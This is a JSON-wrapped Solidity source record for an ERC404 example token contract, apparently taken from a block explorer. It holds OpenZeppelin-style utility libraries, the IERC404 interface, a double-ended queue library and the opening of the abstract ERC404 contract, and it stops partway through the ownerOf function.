{"SourceCode": "{{\r\n  \"language\": \"Solidity\",\r\n  \"sources\": {\r\n    \"contracts/examples/ERC404Example.sol\": {\r\n      \"content\": \"pragma solidity ^0.8.0;\\n\\n\\nabstract contract Context {\\n    function _msgSender() internal view virtual returns (address) {\\n        return msg.sender;\\n    }\\n\\n    function _msgData() internal view virtual returns (bytes calldata) {\\n        return msg.data;\\n    }\\n\\n    function _contextSuffixLength() internal view virtual returns (uint256) {\\n        return 0;\\n    }\\n}\\n\\nabstract contract Ownable is Context {\\n    address private _owner;\\n\\n    /**\\n     * @dev The caller account is not authorized to perform an operation.\\n     */\\n    error OwnableUnauthorizedAccount(address account);\\n\\n    /**\\n     * @dev The owner is not a valid owner account. (eg. `address(0)`)\\n     */\\n    error OwnableInvalidOwner(address owner);\\n\\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\\n\\n    /**\\n     * @dev Initializes the contract setting the address provided by the deployer as the initial owner.\\n     */\\n    constructor(address initialOwner) {\\n        if (initialOwner == address(0)) {\\n            revert OwnableInvalidOwner(address(0));\\n        }\\n        _transferOwnership(initialOwner);\\n    }\\n\\n    /**\\n     * @dev Throws if called by any account other than the owner.\\n     */\\n    modifier onlyOwner() {\\n        _checkOwner();\\n        _;\\n    }\\n\\n    /**\\n     * @dev Returns the address of the current owner.\\n     */\\n    function owner() public view virtual returns (address) {\\n        return _owner;\\n    }\\n\\n    /**\\n     * @dev Throws if the sender is not the owner.\\n     */\\n    function _checkOwner() internal view virtual {\\n        if (owner() != _msgSender()) {\\n            revert OwnableUnauthorizedAccount(_msgSender());\\n        }\\n    }\\n\\n    /**\\n     * @dev Leaves the contract without owner. It will not be possible to call\\n     * `onlyOwner` functions. Can only be called by the current owner.\\n     *\\n     * NOTE: Renouncing ownership will leave the contract without an owner,\\n     * thereby disabling any functionality that is only available to the owner.\\n     */\\n    function renounceOwnership() public virtual onlyOwner {\\n        _transferOwnership(address(0));\\n    }\\n\\n    /**\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\n     * Can only be called by the current owner.\\n     */\\n    function transferOwnership(address newOwner) public virtual onlyOwner {\\n        if (newOwner == address(0)) {\\n            revert OwnableInvalidOwner(address(0));\\n        }\\n        _transferOwnership(newOwner);\\n    }\\n\\n    /**\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\n     * Internal function without access restriction.\\n     */\\n    function _transferOwnership(address newOwner) internal virtual {\\n        address oldOwner = _owner;\\n        _owner = newOwner;\\n        emit OwnershipTransferred(oldOwner, newOwner);\\n    }\\n}\\n\\nlibrary Math {\\n    /**\\n     * @dev Muldiv operation overflow.\\n     */\\n    error MathOverflowedMulDiv();\\n\\n    enum Rounding {\\n        Floor, // Toward negative infinity\\n        Ceil, // Toward positive infinity\\n        Trunc, // Toward zero\\n        Expand // Away from zero\\n    }\\n\\n    /**\\n     * @dev Returns the addition of two unsigned integers, with an overflow flag.\\n     */\\n    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {\\n        unchecked {\\n            uint256 c = a + b;\\n            if (c < a) return (false, 0);\\n            return (true, c);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.\\n     */\\n    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {\\n        unchecked {\\n            if (b > a) return (false, 0);\\n            return (true, a - b);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.\\n     */\\n    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {\\n        unchecked {\\n            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\\n            // benefit is lost if 'b' is also tested.\\n            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\\n            if (a == 0) return (true, 0);\\n            uint256 c = a * b;\\n            if (c / a != b) return (false, 0);\\n            return (true, c);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the division of two unsigned integers, with a division by zero flag.\\n     */\\n    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {\\n        unchecked {\\n            if (b == 0) return (false, 0);\\n            return (true, a / b);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.\\n     */\\n    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {\\n        unchecked {\\n            if (b == 0) return (false, 0);\\n            return (true, a % b);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the largest of two numbers.\\n     */\\n    function max(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return a > b ? a : b;\\n    }\\n\\n    /**\\n     * @dev Returns the smallest of two numbers.\\n     */\\n    function min(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return a < b ? a : b;\\n    }\\n\\n    /**\\n     * @dev Returns the average of two numbers. The result is rounded towards\\n     * zero.\\n     */\\n    function average(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // (a + b) / 2 can overflow.\\n        return (a & b) + (a ^ b) / 2;\\n    }\\n\\n    /**\\n     * @dev Returns the ceiling of the division of two numbers.\\n     *\\n     * This differs from standard division with `/` in that it rounds towards infinity instead\\n     * of rounding towards zero.\\n     */\\n    function ceilDiv(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (b == 0) {\\n            // Guarantee the same behavior as in a regular Solidity division.\\n            return a / b;\\n        }\\n\\n        // (a + b - 1) / b can overflow on addition, so we distribute.\\n        return a == 0 ? 0 : (a - 1) / b + 1;\\n    }\\n\\n    /**\\n     * @notice Calculates floor(x * y / denominator) with full precision. Throws if result overflows a uint256 or\\n     * denominator == 0.\\n     * @dev Original credit to Remco Bloemen under MIT license (https://xn--2-umb.com/21/muldiv) with further edits by\\n     * Uniswap Labs also under MIT license.\\n     */\\n    function mulDiv(uint256 x, uint256 y, uint256 denominator) internal pure returns (uint256 result) {\\n        unchecked {\\n            // 512-bit multiply [prod1 prod0] = x * y. Compute the product mod 2^256 and mod 2^256 - 1, then use\\n            // use the Chinese Remainder Theorem to reconstruct the 512 bit result. The result is stored in two 256\\n            // variables such that product = prod1 * 2^256 + prod0.\\n            uint256 prod0 = x * y; // Least significant 256 bits of the product\\n            uint256 prod1; // Most significant 256 bits of the product\\n            assembly {\\n                let mm := mulmod(x, y, not(0))\\n                prod1 := sub(sub(mm, prod0), lt(mm, prod0))\\n            }\\n\\n            // Handle non-overflow cases, 256 by 256 division.\\n            if (prod1 == 0) {\\n                // Solidity will revert if denominator == 0, unlike the div opcode on its own.\\n                // The surrounding unchecked block does not change this fact.\\n                // See https://docs.soliditylang.org/en/latest/control-structures.html#checked-or-unchecked-arithmetic.\\n                return prod0 / denominator;\\n            }\\n\\n            // Make sure the result is less than 2^256. Also prevents denominator == 0.\\n            if (denominator <= prod1) {\\n                revert MathOverflowedMulDiv();\\n            }\\n\\n            ///////////////////////////////////////////////\\n            // 512 by 256 division.\\n            ///////////////////////////////////////////////\\n\\n            // Make division exact by subtracting the remainder from [prod1 prod0].\\n            uint256 remainder;\\n            assembly {\\n                // Compute remainder using mulmod.\\n                remainder := mulmod(x, y, denominator)\\n\\n                // Subtract 256 bit number from 512 bit number.\\n                prod1 := sub(prod1, gt(remainder, prod0))\\n                prod0 := sub(prod0, remainder)\\n            }\\n\\n            // Factor powers of two out of denominator and compute largest power of two divisor of denominator.\\n            // Always >= 1. See https://cs.stackexchange.com/q/138556/92363.\\n\\n            uint256 twos = denominator & (0 - denominator);\\n            assembly {\\n                // Divide denominator by twos.\\n                denominator := div(denominator, twos)\\n\\n                // Divide [prod1 prod0] by twos.\\n                prod0 := div(prod0, twos)\\n\\n                // Flip twos such that it is 2^256 / twos. If twos is zero, then it becomes one.\\n                twos := add(div(sub(0, twos), twos), 1)\\n            }\\n\\n            // Shift in bits from prod1 into prod0.\\n            prod0 |= prod1 * twos;\\n\\n            // Invert denominator mod 2^256. Now that denominator is an odd number, it has an inverse modulo 2^256 such\\n            // that denominator * inv = 1 mod 2^256. Compute the inverse by starting with a seed that is correct for\\n            // four bits. That is, denominator * inv = 1 mod 2^4.\\n            uint256 inverse = (3 * denominator) ^ 2;\\n\\n            // Use the Newton-Raphson iteration to improve the precision. Thanks to Hensel's lifting lemma, this also\\n            // works in modular arithmetic, doubling the correct bits in each step.\\n            inverse *= 2 - denominator * inverse; // inverse mod 2^8\\n            inverse *= 2 - denominator * inverse; // inverse mod 2^16\\n            inverse *= 2 - denominator * inverse; // inverse mod 2^32\\n            inverse *= 2 - denominator * inverse; // inverse mod 2^64\\n            inverse *= 2 - denominator * inverse; // inverse mod 2^128\\n            inverse *= 2 - denominator * inverse; // inverse mod 2^256\\n\\n            // Because the division is now exact we can divide by multiplying with the modular inverse of denominator.\\n            // This will give us the correct result modulo 2^256. Since the preconditions guarantee that the outcome is\\n            // less than 2^256, this is the final result. We don't need to compute the high bits of the result and prod1\\n            // is no longer required.\\n            result = prod0 * inverse;\\n            return result;\\n        }\\n    }\\n\\n    /**\\n     * @notice Calculates x * y / denominator with full precision, following the selected rounding direction.\\n     */\\n    function mulDiv(uint256 x, uint256 y, uint256 denominator, Rounding rounding) internal pure returns (uint256) {\\n        uint256 result = mulDiv(x, y, denominator);\\n        if (unsignedRoundsUp(rounding) && mulmod(x, y, denominator) > 0) {\\n            result += 1;\\n        }\\n        return result;\\n    }\\n\\n    /**\\n     * @dev Returns the square root of a number. If the number is not a perfect square, the value is rounded\\n     * towards zero.\\n     *\\n     * Inspired by Henry S. Warren, Jr.'s \\\"Hacker's Delight\\\" (Chapter 11).\\n     */\\n    function sqrt(uint256 a) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n\\n        // For our first guess, we get the biggest power of 2 which is smaller than the square root of the target.\\n        //\\n        // We know that the \\\"msb\\\" (most significant bit) of our target number `a` is a power of 2 such that we have\\n        // `msb(a) <= a < 2*msb(a)`. This value can be written `msb(a)=2**k` with `k=log2(a)`.\\n        //\\n        // This can be rewritten `2**log2(a) <= a < 2**(log2(a) + 1)`\\n        // \u2192 `sqrt(2**k) <= sqrt(a) < sqrt(2**(k+1))`\\n        // \u2192 `2**(k/2) <= sqrt(a) < 2**((k+1)/2) <= 2**(k/2 + 1)`\\n        //\\n        // Consequently, `2**(log2(a) / 2)` is a good first approximation of `sqrt(a)` with at least 1 correct bit.\\n        uint256 result = 1 << (log2(a) >> 1);\\n\\n        // At this point `result` is an estimation with one bit of precision. We know the true value is a uint128,\\n        // since it is the square root of a uint256. Newton's method converges quadratically (precision doubles at\\n        // every iteration). We thus need at most 7 iteration to turn our partial result with one bit of precision\\n        // into the expected uint128 result.\\n        unchecked {\\n            result = (result + a / result) >> 1;\\n            result = (result + a / result) >> 1;\\n            result = (result + a / result) >> 1;\\n            result = (result + a / result) >> 1;\\n            result = (result + a / result) >> 1;\\n            result = (result + a / result) >> 1;\\n            result = (result + a / result) >> 1;\\n            return min(result, a / result);\\n        }\\n    }\\n\\n    /**\\n     * @notice Calculates sqrt(a), following the selected rounding direction.\\n     */\\n    function sqrt(uint256 a, Rounding rounding) internal pure returns (uint256) {\\n        unchecked {\\n            uint256 result = sqrt(a);\\n            return result + (unsignedRoundsUp(rounding) && result * result < a ? 1 : 0);\\n        }\\n    }\\n\\n    /**\\n     * @dev Return the log in base 2 of a positive value rounded towards zero.\\n     * Returns 0 if given 0.\\n     */\\n    function log2(uint256 value) internal pure returns (uint256) {\\n        uint256 result = 0;\\n        unchecked {\\n            if (value >> 128 > 0) {\\n                value >>= 128;\\n                result += 128;\\n            }\\n            if (value >> 64 > 0) {\\n                value >>= 64;\\n                result += 64;\\n            }\\n            if (value >> 32 > 0) {\\n                value >>= 32;\\n                result += 32;\\n            }\\n            if (value >> 16 > 0) {\\n                value >>= 16;\\n                result += 16;\\n            }\\n            if (value >> 8 > 0) {\\n                value >>= 8;\\n                result += 8;\\n            }\\n            if (value >> 4 > 0) {\\n                value >>= 4;\\n                result += 4;\\n            }\\n            if (value >> 2 > 0) {\\n                value >>= 2;\\n                result += 2;\\n            }\\n            if (value >> 1 > 0) {\\n                result += 1;\\n            }\\n        }\\n        return result;\\n    }\\n\\n    /**\\n     * @dev Return the log in base 2, following the selected rounding direction, of a positive value.\\n     * Returns 0 if given 0.\\n     */\\n    function log2(uint256 value, Rounding rounding) internal pure returns (uint256) {\\n        unchecked {\\n            uint256 result = log2(value);\\n            return result + (unsignedRoundsUp(rounding) && 1 << result < value ? 1 : 0);\\n        }\\n    }\\n\\n    /**\\n     * @dev Return the log in base 10 of a positive value rounded towards zero.\\n     * Returns 0 if given 0.\\n     */\\n    function log10(uint256 value) internal pure returns (uint256) {\\n        uint256 result = 0;\\n        unchecked {\\n            if (value >= 10 ** 64) {\\n                value /= 10 ** 64;\\n                result += 64;\\n            }\\n            if (value >= 10 ** 32) {\\n                value /= 10 ** 32;\\n                result += 32;\\n            }\\n            if (value >= 10 ** 16) {\\n                value /= 10 ** 16;\\n                result += 16;\\n            }\\n            if (value >= 10 ** 8) {\\n                value /= 10 ** 8;\\n                result += 8;\\n            }\\n            if (value >= 10 ** 4) {\\n                value /= 10 ** 4;\\n                result += 4;\\n            }\\n            if (value >= 10 ** 2) {\\n                value /= 10 ** 2;\\n                result += 2;\\n            }\\n            if (value >= 10 ** 1) {\\n                result += 1;\\n            }\\n        }\\n        return result;\\n    }\\n\\n    /**\\n     * @dev Return the log in base 10, following the selected rounding direction, of a positive value.\\n     * Returns 0 if given 0.\\n     */\\n    function log10(uint256 value, Rounding rounding) internal pure returns (uint256) {\\n        unchecked {\\n            uint256 result = log10(value);\\n            return result + (unsignedRoundsUp(rounding) && 10 ** result < value ? 1 : 0);\\n        }\\n    }\\n\\n    /**\\n     * @dev Return the log in base 256 of a positive value rounded towards zero.\\n     * Returns 0 if given 0.\\n     *\\n     * Adding one to the result gives the number of pairs of hex symbols needed to represent `value` as a hex string.\\n     */\\n    function log256(uint256 value) internal pure returns (uint256) {\\n        uint256 result = 0;\\n        unchecked {\\n            if (value >> 128 > 0) {\\n                value >>= 128;\\n                result += 16;\\n            }\\n            if (value >> 64 > 0) {\\n                value >>= 64;\\n                result += 8;\\n            }\\n            if (value >> 32 > 0) {\\n                value >>= 32;\\n                result += 4;\\n            }\\n            if (value >> 16 > 0) {\\n                value >>= 16;\\n                result += 2;\\n            }\\n            if (value >> 8 > 0) {\\n                result += 1;\\n            }\\n        }\\n        return result;\\n    }\\n\\n    /**\\n     * @dev Return the log in base 256, following the selected rounding direction, of a positive value.\\n     * Returns 0 if given 0.\\n     */\\n    function log256(uint256 value, Rounding rounding) internal pure returns (uint256) {\\n        unchecked {\\n            uint256 result = log256(value);\\n            return result + (unsignedRoundsUp(rounding) && 1 << (result << 3) < value ? 1 : 0);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns whether a provided rounding mode is considered rounding up for unsigned integers.\\n     */\\n    function unsignedRoundsUp(Rounding rounding) internal pure returns (bool) {\\n        return uint8(rounding) % 2 == 1;\\n    }\\n}\\n\\nlibrary SignedMath {\\n    /**\\n     * @dev Returns the largest of two signed numbers.\\n     */\\n    function max(int256 a, int256 b) internal pure returns (int256) {\\n        return a > b ? a : b;\\n    }\\n\\n    /**\\n     * @dev Returns the smallest of two signed numbers.\\n     */\\n    function min(int256 a, int256 b) internal pure returns (int256) {\\n        return a < b ? a : b;\\n    }\\n\\n    /**\\n     * @dev Returns the average of two signed numbers without overflow.\\n     * The result is rounded towards zero.\\n     */\\n    function average(int256 a, int256 b) internal pure returns (int256) {\\n        // Formula from the book \\\"Hacker's Delight\\\"\\n        int256 x = (a & b) + ((a ^ b) >> 1);\\n        return x + (int256(uint256(x) >> 255) & (a ^ b));\\n    }\\n\\n    /**\\n     * @dev Returns the absolute unsigned value of a signed value.\\n     */\\n    function abs(int256 n) internal pure returns (uint256) {\\n        unchecked {\\n            // must be unchecked in order to support `n = type(int256).min`\\n            return uint256(n >= 0 ? n : -n);\\n        }\\n    }\\n}\\n\\nlibrary Strings {\\n    bytes16 private constant HEX_DIGITS = \\\"0123456789abcdef\\\";\\n    uint8 private constant ADDRESS_LENGTH = 20;\\n\\n    /**\\n     * @dev The `value` string doesn't fit in the specified `length`.\\n     */\\n    error StringsInsufficientHexLength(uint256 value, uint256 length);\\n\\n    /**\\n     * @dev Converts a `uint256` to its ASCII `string` decimal representation.\\n     */\\n    function toString(uint256 value) internal pure returns (string memory) {\\n        unchecked {\\n            uint256 length = Math.log10(value) + 1;\\n            string memory buffer = new string(length);\\n            uint256 ptr;\\n            /// @solidity memory-safe-assembly\\n            assembly {\\n                ptr := add(buffer, add(32, length))\\n            }\\n            while (true) {\\n                ptr--;\\n                /// @solidity memory-safe-assembly\\n                assembly {\\n                    mstore8(ptr, byte(mod(value, 10), HEX_DIGITS))\\n                }\\n                value /= 10;\\n                if (value == 0) break;\\n            }\\n            return buffer;\\n        }\\n    }\\n\\n    /**\\n     * @dev Converts a `int256` to its ASCII `string` decimal representation.\\n     */\\n    function toStringSigned(int256 value) internal pure returns (string memory) {\\n        return string.concat(value < 0 ? \\\"-\\\" : \\\"\\\", toString(SignedMath.abs(value)));\\n    }\\n\\n    /**\\n     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.\\n     */\\n    function toHexString(uint256 value) internal pure returns (string memory) {\\n        unchecked {\\n            return toHexString(value, Math.log256(value) + 1);\\n        }\\n    }\\n\\n    /**\\n     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.\\n     */\\n    function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {\\n        uint256 localValue = value;\\n        bytes memory buffer = new bytes(2 * length + 2);\\n        buffer[0] = \\\"0\\\";\\n        buffer[1] = \\\"x\\\";\\n        for (uint256 i = 2 * length + 1; i > 1; --i) {\\n            buffer[i] = HEX_DIGITS[localValue & 0xf];\\n            localValue >>= 4;\\n        }\\n        if (localValue != 0) {\\n            revert StringsInsufficientHexLength(value, length);\\n        }\\n        return string(buffer);\\n    }\\n\\n    /**\\n     * @dev Converts an `address` with fixed length of 20 bytes to its not checksummed ASCII `string` hexadecimal\\n     * representation.\\n     */\\n    function toHexString(address addr) internal pure returns (string memory) {\\n        return toHexString(uint256(uint160(addr)), ADDRESS_LENGTH);\\n    }\\n\\n    /**\\n     * @dev Returns true if the two strings are equal.\\n     */\\n    function equal(string memory a, string memory b) internal pure returns (bool) {\\n        return bytes(a).length == bytes(b).length && keccak256(bytes(a)) == keccak256(bytes(b));\\n    }\\n}\\n\\ninterface IERC721Receiver {\\n    /**\\n     * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}\\n     * by `operator` from `from`, this function is called.\\n     *\\n     * It must return its Solidity selector to confirm the token transfer.\\n     * If any other value is returned or the interface is not implemented by the recipient, the transfer will be\\n     * reverted.\\n     *\\n     * The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`.\\n     */\\n    function onERC721Received(\\n        address operator,\\n        address from,\\n        uint256 tokenId,\\n        bytes calldata data\\n    ) external returns (bytes4);\\n}\\n\\ninterface IERC165 {\\n    /**\\n     * @dev Returns true if this contract implements the interface defined by\\n     * `interfaceId`. See the corresponding\\n     * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]\\n     * to learn more about how these ids are created.\\n     *\\n     * This function call must use less than 30 000 gas.\\n     */\\n    function supportsInterface(bytes4 interfaceId) external view returns (bool);\\n}\\n\\ninterface IERC404 {\\n  error NotFound();\\n  error InvalidTokenId();\\n  error AlreadyExists();\\n  error InvalidRecipient();\\n  error InvalidSender();\\n  error InvalidSpender();\\n  error InvalidOperator();\\n  error UnsafeRecipient();\\n  error RecipientIsERC721TransferExempt();\\n  error Unauthorized();\\n  error InsufficientAllowance();\\n  error DecimalsTooLow();\\n  error PermitDeadlineExpired();\\n  error InvalidSigner();\\n  error InvalidApproval();\\n  error OwnedIndexOverflow();\\n  error MintLimitReached();\\n  error InvalidExemption();\\n\\n  function name() external view returns (string memory);\\n  function symbol() external view returns (string memory);\\n  function decimals() external view returns (uint8);\\n  function totalSupply() external view returns (uint256);\\n  function erc20TotalSupply() external view returns (uint256);\\n  function erc721TotalSupply() external view returns (uint256);\\n  function balanceOf(address owner_) external view returns (uint256);\\n  function erc721BalanceOf(address owner_) external view returns (uint256);\\n  function erc20BalanceOf(address owner_) external view returns (uint256);\\n  function erc721TransferExempt(address account_) external view returns (bool);\\n  function isApprovedForAll(\\n    address owner_,\\n    address operator_\\n  ) external view returns (bool);\\n  function allowance(\\n    address owner_,\\n    address spender_\\n  ) external view returns (uint256);\\n  function owned(address owner_) external view returns (uint256[] memory);\\n  function ownerOf(uint256 id_) external view returns (address erc721Owner);\\n  function tokenURI(uint256 id_) external view returns (string memory);\\n  function approve(\\n    address spender_,\\n    uint256 valueOrId_\\n  ) external returns (bool);\\n  function erc20Approve(\\n    address spender_,\\n    uint256 value_\\n  ) external returns (bool);\\n  function erc721Approve(address spender_, uint256 id_) external;\\n  function setApprovalForAll(address operator_, bool approved_) external;\\n  function transferFrom(\\n    address from_,\\n    address to_,\\n    uint256 valueOrId_\\n  ) external returns (bool);\\n  function erc20TransferFrom(\\n    address from_,\\n    address to_,\\n    uint256 value_\\n  ) external returns (bool);\\n  function erc721TransferFrom(address from_, address to_, uint256 id_) external;\\n  function transfer(address to_, uint256 amount_) external returns (bool);\\n  function getERC721QueueLength() external view returns (uint256);\\n  function getERC721TokensInQueue(\\n    uint256 start_,\\n    uint256 count_\\n  ) external view returns (uint256[] memory);\\n  function setSelfERC721TransferExempt(bool state_) external;\\n  function safeTransferFrom(address from_, address to_, uint256 id_) external;\\n  function safeTransferFrom(\\n    address from_,\\n    address to_,\\n    uint256 id_,\\n    bytes calldata data_\\n  ) external;\\n  function DOMAIN_SEPARATOR() external view returns (bytes32);\\n  function permit(\\n    address owner_,\\n    address spender_,\\n    uint256 value_,\\n    uint256 deadline_,\\n    uint8 v_,\\n    bytes32 r_,\\n    bytes32 s_\\n  ) external;\\n}\\n\\nlibrary DoubleEndedQueue {\\n  /**\\n   * @dev An operation (e.g. {front}) couldn't be completed due to the queue being empty.\\n   */\\n  error QueueEmpty();\\n\\n  /**\\n   * @dev A push operation couldn't be completed due to the queue being full.\\n   */\\n  error QueueFull();\\n\\n  /**\\n   * @dev An operation (e.g. {at}) couldn't be completed due to an index being out of bounds.\\n   */\\n  error QueueOutOfBounds();\\n\\n  /**\\n   * @dev Indices are 128 bits so begin and end are packed in a single storage slot for efficient access.\\n   *\\n   * Struct members have an underscore prefix indicating that they are \\\"private\\\" and should not be read or written to\\n   * directly. Use the functions provided below instead. Modifying the struct manually may violate assumptions and\\n   * lead to unexpected behavior.\\n   *\\n   * The first item is at data[begin] and the last item is at data[end - 1]. This range can wrap around.\\n   */\\n  struct Uint256Deque {\\n    uint128 _begin;\\n    uint128 _end;\\n    mapping(uint128 index => uint256) _data;\\n  }\\n\\n  /**\\n   * @dev Inserts an item at the end of the queue.\\n   *\\n   * Reverts with {QueueFull} if the queue is full.\\n   */\\n  function pushBack(Uint256Deque storage deque, uint256 value) internal {\\n    unchecked {\\n      uint128 backIndex = deque._end;\\n      if (backIndex + 1 == deque._begin) revert QueueFull();\\n      deque._data[backIndex] = value;\\n      deque._end = backIndex + 1;\\n    }\\n  }\\n\\n  /**\\n   * @dev Removes the item at the end of the queue and returns it.\\n   *\\n   * Reverts with {QueueEmpty} if the queue is empty.\\n   */\\n  function popBack(\\n    Uint256Deque storage deque\\n  ) internal returns (uint256 value) {\\n    unchecked {\\n      uint128 backIndex = deque._end;\\n      if (backIndex == deque._begin) revert QueueEmpty();\\n      --backIndex;\\n      value = deque._data[backIndex];\\n      delete deque._data[backIndex];\\n      deque._end = backIndex;\\n    }\\n  }\\n\\n  /**\\n   * @dev Inserts an item at the beginning of the queue.\\n   *\\n   * Reverts with {QueueFull} if the queue is full.\\n   */\\n  function pushFront(Uint256Deque storage deque, uint256 value) internal {\\n    unchecked {\\n      uint128 frontIndex = deque._begin - 1;\\n      if (frontIndex == deque._end) revert QueueFull();\\n      deque._data[frontIndex] = value;\\n      deque._begin = frontIndex;\\n    }\\n  }\\n\\n  /**\\n   * @dev Removes the item at the beginning of the queue and returns it.\\n   *\\n   * Reverts with `QueueEmpty` if the queue is empty.\\n   */\\n  function popFront(\\n    Uint256Deque storage deque\\n  ) internal returns (uint256 value) {\\n    unchecked {\\n      uint128 frontIndex = deque._begin;\\n      if (frontIndex == deque._end) revert QueueEmpty();\\n      value = deque._data[frontIndex];\\n      delete deque._data[frontIndex];\\n      deque._begin = frontIndex + 1;\\n    }\\n  }\\n\\n  /**\\n   * @dev Returns the item at the beginning of the queue.\\n   *\\n   * Reverts with `QueueEmpty` if the queue is empty.\\n   */\\n  function front(\\n    Uint256Deque storage deque\\n  ) internal view returns (uint256 value) {\\n    if (empty(deque)) revert QueueEmpty();\\n    return deque._data[deque._begin];\\n  }\\n\\n  /**\\n   * @dev Returns the item at the end of the queue.\\n   *\\n   * Reverts with `QueueEmpty` if the queue is empty.\\n   */\\n  function back(\\n    Uint256Deque storage deque\\n  ) internal view returns (uint256 value) {\\n    if (empty(deque)) revert QueueEmpty();\\n    unchecked {\\n      return deque._data[deque._end - 1];\\n    }\\n  }\\n\\n  /**\\n   * @dev Return the item at a position in the queue given by `index`, with the first item at 0 and last item at\\n   * `length(deque) - 1`.\\n   *\\n   * Reverts with `QueueOutOfBounds` if the index is out of bounds.\\n   */\\n  function at(\\n    Uint256Deque storage deque,\\n    uint256 index\\n  ) internal view returns (uint256 value) {\\n    if (index >= length(deque)) revert QueueOutOfBounds();\\n    // By construction, length is a uint128, so the check above ensures that index can be safely downcast to uint128\\n    unchecked {\\n      return deque._data[deque._begin + uint128(index)];\\n    }\\n  }\\n\\n  /**\\n   * @dev Resets the queue back to being empty.\\n   *\\n   * NOTE: The current items are left behind in storage. This does not affect the functioning of the queue, but misses\\n   * out on potential gas refunds.\\n   */\\n  function clear(Uint256Deque storage deque) internal {\\n    deque._begin = 0;\\n    deque._end = 0;\\n  }\\n\\n  /**\\n   * @dev Returns the number of items in the queue.\\n   */\\n  function length(Uint256Deque storage deque) internal view returns (uint256) {\\n    unchecked {\\n      return uint256(deque._end - deque._begin);\\n    }\\n  }\\n\\n  /**\\n   * @dev Returns true if the queue is empty.\\n   */\\n  function empty(Uint256Deque storage deque) internal view returns (bool) {\\n    return deque._end == deque._begin;\\n  }\\n}\\n\\nlibrary ERC721Events {\\n  event ApprovalForAll(\\n    address indexed owner,\\n    address indexed operator,\\n    bool approved\\n  );\\n  event Approval(\\n    address indexed owner,\\n    address indexed spender,\\n    uint256 indexed id\\n  );\\n  event Transfer(address indexed from, address indexed to, uint256 indexed id);\\n}\\n\\nlibrary ERC20Events {\\n  event Approval(address indexed owner, address indexed spender, uint256 value);\\n  event Transfer(address indexed from, address indexed to, uint256 amount);\\n}\\n\\nabstract contract ERC404 is IERC404 {\\n  using DoubleEndedQueue for DoubleEndedQueue.Uint256Deque;\\n\\n  /// @dev The queue of ERC-721 tokens stored in the contract.\\n  DoubleEndedQueue.Uint256Deque private _storedERC721Ids;\\n\\n  /// @dev Token name\\n  string public name;\\n\\n  /// @dev Token symbol\\n  string public symbol;\\n\\n  /// @dev Decimals for ERC-20 representation\\n  uint8 public immutable decimals;\\n\\n  /// @dev Units for ERC-20 representation\\n  uint256 public immutable units;\\n\\n  /// @dev Total supply in ERC-20 representation\\n  uint256 public totalSupply;\\n\\n  /// @dev Current mint counter which also represents the highest\\n  ///      minted id, monotonically increasing to ensure accurate ownership\\n  uint256 public minted;\\n\\n  /// @dev Initial chain id for EIP-2612 support\\n  uint256 internal immutable _INITIAL_CHAIN_ID;\\n\\n  /// @dev Initial domain separator for EIP-2612 support\\n  bytes32 internal immutable _INITIAL_DOMAIN_SEPARATOR;\\n\\n  /// @dev Balance of user in ERC-20 representation\\n  mapping(address => uint256) public balanceOf;\\n\\n  /// @dev Allowance of user in ERC-20 representation\\n  mapping(address => mapping(address => uint256)) public allowance;\\n\\n  /// @dev Approval in ERC-721 representaion\\n  mapping(uint256 => address) public getApproved;\\n\\n  /// @dev Approval for all in ERC-721 representation\\n  mapping(address => mapping(address => bool)) public isApprovedForAll;\\n\\n  /// @dev Packed representation of ownerOf and owned indices\\n  mapping(uint256 => uint256) internal _ownedData;\\n\\n  /// @dev Array of owned ids in ERC-721 representation\\n  mapping(address => uint256[]) internal _owned;\\n\\n  /// @dev Addresses that are exempt from ERC-721 transfer, typically for gas savings (pairs, routers, etc)\\n  mapping(address => bool) internal _erc721TransferExempt;\\n\\n  /// @dev EIP-2612 nonces\\n  mapping(address => uint256) public nonces;\\n\\n  /// @dev Address bitmask for packed ownership data\\n  uint256 private constant _BITMASK_ADDRESS = (1 << 160) - 1;\\n\\n  /// @dev Owned index bitmask for packed ownership data\\n  uint256 private constant _BITMASK_OWNED_INDEX = ((1 << 96) - 1) << 160;\\n\\n  /// @dev Constant for token id encoding\\n  uint256 public constant ID_ENCODING_PREFIX = 1 << 255;\\n\\n  constructor(string memory name_, string memory symbol_, uint8 decimals_) {\\n    name = name_;\\n    symbol = symbol_;\\n\\n    if (decimals_ < 18) {\\n      revert DecimalsTooLow();\\n    }\\n\\n    decimals = decimals_;\\n    units = 10 ** decimals;\\n\\n    // EIP-2612 initialization\\n    _INITIAL_CHAIN_ID = block.chainid;\\n    _INITIAL_DOMAIN_SEPARATOR = _computeDomainSeparator();\\n  }\\n\\n  /// @notice Function to find owner of a given ERC-721 token\\n  function ownerOf(\\n    uint256 id_\\n  ) public view virtual returns (address erc721Owner) {\\n    erc721Owner = _getOwnerOf(id_);\\n\\n    if (!_isValidTokenId(id_)) {\\n      revert InvalidTokenId();\\n    }\\n\\n    